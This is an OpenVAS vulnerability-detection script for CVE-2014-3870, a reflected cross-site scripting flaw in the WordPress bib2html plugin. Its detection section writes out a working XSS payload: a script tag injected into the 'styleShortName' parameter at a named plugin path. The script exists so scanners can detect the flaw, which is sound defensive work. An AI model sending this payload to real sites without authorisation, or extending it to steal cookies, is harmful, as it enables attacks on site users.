###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_bib2html_xss_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
#
# Wordpress bib2html 'styleShortName' Cross Site Scripting Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804592");
  script_version("$Revision: 6769 $");
  script_cve_id("CVE-2014-3870");
  script_bugtraq_id(67589);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-06-02 15:00:13 +0530 (Mon, 02 Jun 2014)");
  script_name("Wordpress bib2html 'styleShortName' Cross Site Scripting Vulnerability");

  tag_summary =
"This host is installed with Wordpress bib2html Plugin and is prone to
cross site scripting vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via the 'styleShortName' HTTP GET parameter to /OSBiB/create/index.php
script is not properly sanitised before returning to the user.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site.

Impact Level: Application";

  tag_affected =
"WordPress bib2html Plugin version 0.9.3, Other versions may also be affected.";

  tag_solution =
"No Solution or patch is available as of 1st June, 2014. Information
regarding this issue will updated once the solution details are available.
For updates refer to http://wordpress.org/plugins/bib2html";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name:"solution_type", value:"NoneAvailable");

  script_xref(name : "URL" , value : "http://1337day.com/exploit/22281");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/126782");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/bib2html/OSBiB/create/index.php?'
          + 'action=adminStyleAdd&styleShortName="/><script>'
          + 'alert(document.cookie);</script>';

## Confirm the Exploit
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\);</script>",
   extra_check:">OSBib-Create<"))
{
  security_message(http_port);
  exit(0);
}
